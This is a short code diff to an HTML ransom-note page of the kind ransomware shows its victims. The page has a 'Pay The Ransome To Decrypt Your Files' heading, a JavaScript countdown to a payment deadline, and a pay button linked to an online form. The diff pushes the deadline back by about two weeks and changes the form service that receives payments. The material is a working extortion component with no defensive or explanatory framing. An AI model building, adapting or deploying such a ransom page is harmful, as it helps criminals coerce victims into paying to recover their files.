@@ -79,7 +79,7 @@ p {
 
 <script>
 // Set the date we're counting down to
-var countDownDate = new Date("Jan 5, 2021 15:37:25").getTime();
+var countDownDate = new Date("Jan 20, 2021 15:37:25").getTime();
 
 // Update the count down every 1 second
 var x = setInterval(function() {
@@ -112,7 +112,7 @@ var x = setInterval(function() {
 <body>
 <h1>Pay The Ransome To Decrypt Your Files</h1>
     
- <form action="https://forms.gle/UddHE3hEdHa6AenDA">
+ <form action="https://www.emailmeform.com/builder/form/hg2wXGrB3tQ1yWd23fc">
          <button type="submit">Click here to pay the ransome</button>
       </form>
 
